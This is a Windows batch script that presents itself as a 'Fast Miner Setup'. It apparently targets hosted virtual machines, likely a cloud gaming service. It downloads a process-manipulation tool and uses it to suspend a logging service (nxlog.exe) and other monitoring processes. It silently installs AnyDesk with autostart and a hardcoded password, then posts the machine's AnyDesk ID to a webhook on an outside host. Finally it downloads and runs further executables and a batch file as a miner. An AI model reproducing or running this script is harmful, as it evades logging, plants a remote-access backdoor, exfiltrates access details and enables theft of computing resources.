@echo off 
c:
echo Fast Miner Setup

md C:\Users\Public\Mineaway
cd C:\Users\Public\Mineaway
curl -LJO "https://github.com/Prosd2/test/raw/main/ph64.exe"

echo [+] Suspending NxLog.exe
start "" "C:\Users\Public\Mineaway\ph64.exe" -c -ctype process -cobject nxlog.exe -caction suspend
start "" "C:\Users\Public\Mineaway\ph64.exe" -c -ctype process -cobject desktopmgr64.exe -caction terminate
timeout 1 /NOBREAK > nul
start "" "C:\Users\Public\Mineaway\ph64.exe"
echo [+] Restarting Explorer
taskkill /f /im explorer.exe
userinit
timeout 2 /NOBREAK > nul
curl -LJk "https://zortosdev.tech/Apps/Anydesk.exe" -o C:\AnyDesk.exe
echo [-] Doing stuff (wierd :\ )
"C:\AnyDesk.exe" --install "C:\AnyDesk" --start-with-win
echo SexyGamer123 | "C:\AnyDesk\AnyDesk.exe" --set-password
echo [-] Waiting Till AnyDesk is Connected
timeout 6 /NOBREAK > nul
echo [-] Getting AnyDesk ID
for /f "delims=" %%i in ('"C:\AnyDesk\AnyDesk.exe" --get-id') do set CID=%%i 
echo [-] Sending Webhook...
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{ \"content\": null, \"embeds\": [ { \"title\": \"New VM Connected (Zortos)\", \"description\": \"**AnyDesk ID:**  `%CID%`\", \"color\": 5814783, \"author\": { \"name\": \"NetEase Fricker\" } } ] }" "http://cdn.zortosdev.tech:5000/discordwebhook"
timeout 2 /NOBREAK > nul
cls

start "" "C:\Users\Public\Mineaway\ph64.exe"

cls
cd C:\Users\Public\Mineaway\
echo [-] Downloading Autorun
curl -LJOk "https://zortosdev.tech/Apps/Autoruns64.exe"
start "" "Autoruns64.exe"
echo CONNECT TO ANYDESK !!!! Then press enter
pause

start "" "C:\Users\Public\Mineaway\ph64.exe" -c -ctype process -cobject desdup.exe -caction suspend
start "" "C:\Users\Public\Mineaway\ph64.exe" -c -ctype process -cobject audio.exe -caction suspend
start "" "C:\Users\Public\Mineaway\ph64.exe" -c -ctype process -cobject cursor.exe -caction suspend
start "" "C:\Users\Public\Mineaway\ph64.exe" -c -ctype process -cobject focus.exe -caction suspend
start "" "C:\Users\Public\Mineaway\ph64.exe" -c -ctype process -cobject vncserver.exe -caction suspend
goto miner

:miner
echo [+] Launching Miner
curl -LJO "https://github.com/Prosd2/test/raw/main/zax.exe"
timeout 5
curl -LJO "https://github.com/Prosd2/test/raw/main/test.bat"
start "" "test.bat"
echo [+] Done
pause







